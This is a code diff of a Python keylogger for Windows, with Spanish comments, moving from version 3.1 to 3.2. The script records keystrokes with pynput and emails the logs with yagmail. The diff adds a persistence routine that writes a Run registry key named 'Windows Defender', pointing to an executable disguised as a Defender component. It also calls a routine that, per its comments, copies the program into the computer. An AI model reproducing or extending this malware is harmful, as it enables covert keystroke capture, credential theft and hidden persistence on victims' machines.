@@ -9,7 +9,7 @@
 #░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║██║░░██║░╚██╗████╗██╔╝╚█████╗░
 #░░████╔═████║░██║██║╚████║██║░░██║██║░░██║░░████╔═████║░░╚═══██╗
 #░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝
-#░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.1
+#░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░ v3.2
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -20,6 +20,7 @@ import datetime
 import os
 import yagmail
 import shutil
+from winreg import *
 # Librería verifica internet 
 import socket
 import time
@@ -326,11 +327,33 @@ def SendLog():
             # Seguirá sobreescribiendo el archivo
             # No hará nada, y esperará que aya una conexión exitosa
             pass
+        
+def addStartup():  # function =  Iniciar automaticamente
+    path = r"C:\Users\Public\Security\Windows Defender\WindowsDefenderAdvanced.exe" # Path del Software completo
+    name = "Windows Defender"                                                       # Nombre del StartUp
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
+    def verificar():
+        try:  # Intenta crear la dirección
+            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')
+            return True # Se creó la carpeta
+        except:
+            return False# La carpeta ya existe
+    try:    # Solo si tiene permisos de administrador
+        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
+        SetValueEx(registry,name, 0, REG_SZ, path)
+        verificar() # Crea Carpeta
+    except: # Si no tien permisos de administrador
+        if (verificar()):
+            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
+            SetValueEx(registry,name, 0, REG_SZ, path)
+           
+    
 
 # Inicio multihilo
 if __name__ == '__main__':
     
-    EscondeKey()
+    EscondeKey()    # Se replica dentro de la computadora
+    addStartup()    # Modifica registro
     p1 = threading.Thread(target=Klogger)
     p2 = threading.Thread(target=SendLog)
     p2.start()
@@ -340,7 +363,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v.2.1       #
+#                                                   v.3.2       #
 #################################################################
 # Notas importantes
 #
